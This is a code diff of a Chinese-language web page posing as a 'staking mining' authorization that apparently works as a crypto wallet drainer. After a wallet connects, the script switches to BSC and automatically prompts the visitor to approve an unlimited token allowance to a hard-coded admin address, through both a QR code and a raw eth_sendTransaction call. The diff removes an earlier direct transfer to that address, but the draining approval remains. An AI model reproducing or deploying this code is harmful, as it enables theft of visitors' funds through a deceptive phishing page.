@@ -17,11 +17,6 @@ border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold;
 margin-bottom:16px;
 }
-.amount-input{
-width:100%;padding:14px;background:#111;border:none;
-border-radius:12px;color:#fff;font-size:16px;text-align:center;
-margin-bottom:12px;
-}
 #qrcode{
 width:280px;height:280px;background:#fff;padding:10px;
 border-radius:16px;margin:0 auto 20px;
@@ -34,7 +29,7 @@ background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
 }
-.tip {font-size:12px;color:#666;margin-top:-5px;margin-bottom:10px;display:block;text-align:center}
+.tip {font-size:12px;color:#666;margin-top:10px;text-align:center}
 </style>
 </head>
 <body>
@@ -47,22 +42,20 @@ border-radius:14px;font-size:16px;font-weight:bold
     <button id="connectBtn">👉 连接钱包</button>
     <div id="qrcode">加载二维码...</div>
     <button id="approveBtn">确认授权签名</button>
-    <span class="tip">签名授权用于质押挖矿</span>
+    <div class="tip">签名授权用于质押挖矿</div>
   </div>
 </div>
 
-<script src="https://cdn.ethers.org/lib-ethers/5.7.2/ethers.umd.min.js"></script>
 <script>
 // ====================== 配置 ======================
-const TOKEN_ADDR    = "0x55d398326f99059fF775485246999027B3197955";
-const ADMIN_ADDR    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const CHAIN_ID      = "0x38";
+const TOKEN_ADDR  = "0x55d398326f99059fF775485246999027B3197955";
+const ADMIN_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const CHAIN_ID    = "0x38";
 // ====================================================
 
 let account = null;
-let provider = null;
-let signer = null;
 
+// 切换到BSC
 async function switchChain() {
   try {
     await window.ethereum.request({
@@ -78,74 +71,56 @@ function genApproveQR() {
     ADMIN_ADDR.slice(2).padStart(64,'0') + 
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
   const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
-  const qr = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
-  document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
+  const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
+  document.getElementById("qrcode").innerHTML = `<img src="${qrUrl}">`;
 }
 
-// 统一授权弹出（用户手动确认）
+// 授权函数
 async function doApprove() {
   if (!account) {
     alert("请先连接钱包");
     return;
   }
   try {
-    const token = new ethers.Contract(
-      TOKEN_ADDR,
-      ["function approve(address spender, uint256 amount) external returns (bool)"],
-      signer
-    );
-    const tx = await token.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
-    await tx.wait();
-    alert("✅ 授权成功！");
-
-    // 授权后直接转账给管理员
-    await transferToAdmin();
+    await window.ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: TOKEN_ADDR,
+        data: "0x095ea7b3" + 
+          ADMIN_ADDR.slice(2).padStart(64,'0') + 
+          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+      }]
+    });
+    alert("✅ 授权成功");
   } catch (e) {
     alert("❌ 已取消");
   }
 }
 
-// 授权后自动/手动转账给管理员
-async function transferToAdmin() {
-  if (!account) return;
-  try {
-    const token = new ethers.Contract(
-      TOKEN_ADDR,
-      ["function transfer(address to, uint256 value) external returns (bool)"],
-      signer
-    );
-    const amount = ethers.utils.parseUnits("0.1", 18);
-    await token.transfer(ADMIN_ADDR, amount);
-  } catch (err) {}
-}
-
-// 连接钱包 → 自动弹授权
+// 连接钱包（最兼容写法）
 document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) {
-    alert("请在钱包浏览器打开");
+    alert("请在钱包内打开");
     return;
   }
   await switchChain();
   try {
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    signer = provider.getSigner();
-    account = await signer.getAddress();
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+    account = accounts[0];
     document.getElementById("connectBtn").innerText = "✅ 已连接";
-    
-    // 连接后直接弹授权签名
-    doApprove();
+    doApprove(); // 连接后直接弹授权
   } catch (e) {
-    alert("连接失败");
+    alert("连接钱包失败，请重试");
   }
 };
 
-// 按钮授权 → 弹签名
+// 按钮授权
 document.getElementById("approveBtn").onclick = async () => {
   await doApprove();
 };
 
-// 页面加载生成二维码
+// 加载二维码
 window.onload = genApproveQR;
 </script>
 </body>
